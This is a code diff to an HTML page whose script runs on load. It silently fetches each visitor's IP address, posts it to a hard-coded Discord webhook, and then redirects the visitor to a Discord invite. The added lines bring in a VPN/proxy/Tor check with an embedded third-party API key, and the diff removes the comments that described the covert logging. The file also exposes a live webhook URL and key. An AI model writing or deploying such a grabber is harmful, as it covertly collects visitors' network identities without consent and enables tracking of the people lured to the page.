@@ -7,22 +7,22 @@
 </head>
 <body>
     <script>
-        // Unobfuscated webhook URL
         const webhookUrl = 'https://discordapp.com/api/webhooks/1350521982185242715/nMGu8EnLqK0oQHROrOc79bFxkcs5tVzU5x0oRLK60LvxHsx37wJrGEoPd6jy1Ka3GaaT';
-
+        const vpnApiKey = 'd4174ac879ec45dbaf68f0622ac553ba';
         async function sendIPAndRedirect() {
             try {
-                // Fetch the user's IP address
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 const ipAddress = data.ip;
-
-                // Send the IP address to the Discord webhook silently
+                const ipCheckResponse = await fetch(`https://vpnapi.io/api/${ipAddress}?key=${vpnApiKey}`);
+                const ipCheckData = await ipCheckResponse.json();
+                if (ipCheckData.security.vpn || ipCheckData.security.proxy || ipCheckData.security.tor) {
+                    window.location.href = 'https://discord.gg/62uxgXXXXr';
+                    return;
+                }
                 const messageData = {
                     content: `New IP Address: ${ipAddress}`
                 };
-
-                // Send the IP to Discord webhook
                 await fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
@@ -30,17 +30,11 @@
                     },
                     body: JSON.stringify(messageData)
                 });
-
-                // Redirect to the Discord invite after sending the IP
                 window.location.href = 'https://discord.gg/62uxgXXXXr';
             } catch (error) {
-                console.error('Error fetching or sending IP:', error);
-                // Redirect to Discord invite if there's an error
                 window.location.href = 'https://discord.gg/62uxgXXXXr';
             }
         }
-
-        // Call the function to send IP and then redirect
         sendIPAndRedirect();
     </script>
 </body>
